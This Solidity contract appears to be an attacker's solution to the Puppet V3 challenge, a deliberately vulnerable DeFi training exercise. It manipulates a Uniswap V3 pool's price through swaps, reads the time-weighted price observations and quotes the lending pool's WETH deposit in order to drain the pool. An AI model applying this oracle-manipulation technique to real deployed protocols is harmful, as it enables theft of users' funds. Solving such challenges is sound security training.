// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-core/contracts/libraries/TickMath.sol";
import "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
import "./PuppetV3Pool.sol";
import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";

contract HackPuppetV3Pool is IUniswapV3SwapCallback {
    IERC20Minimal public token;
    IUniswapV3Pool public v3pool;
    PuppetV3Pool public lendingPool;
    IERC20Minimal public weth;
    int56[] public tickCumulatives;

    constructor(
        address _token,
        address _v3pool,
        address _lendingPool,
        address _weth
    ) {
        token = IERC20Minimal(_token);
        v3pool = IUniswapV3Pool(_v3pool);
        lendingPool = PuppetV3Pool(_lendingPool);
        weth = IERC20Minimal(_weth);
    }

    function callSwap(int256 _amount) public {
        v3pool.swap(
            address(this),
            false,
            _amount,
            TickMath.MAX_SQRT_RATIO - 1,
            ""
        );
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external override {
        uint256 amount1 = uint256(amount1Delta);
        token.transfer(address(v3pool), amount1);
    }

    function getQuoteFromPool(uint256 _amountOut)
        public
        view
        returns (uint256 _amountIn)
    {
        _amountIn = lendingPool.calculateDepositOfWETHRequired(_amountOut);
    }

    function observePool(uint32[] calldata _secondsAgo)
        public
        returns (
            int56[] memory _tickCumulatives,
            uint160[] memory _secondsPerLiquidityCumulativeX128s
        )
    {
        (_tickCumulatives, _secondsPerLiquidityCumulativeX128s) = v3pool
            .observe(_secondsAgo);
        tickCumulatives.push(_tickCumulatives[0]);
        tickCumulatives.push(_tickCumulatives[1]);
    }

    function transferWeth() public {
        uint256 bal = weth.balanceOf(address(this));
        weth.transfer(msg.sender, bal);
    }
}
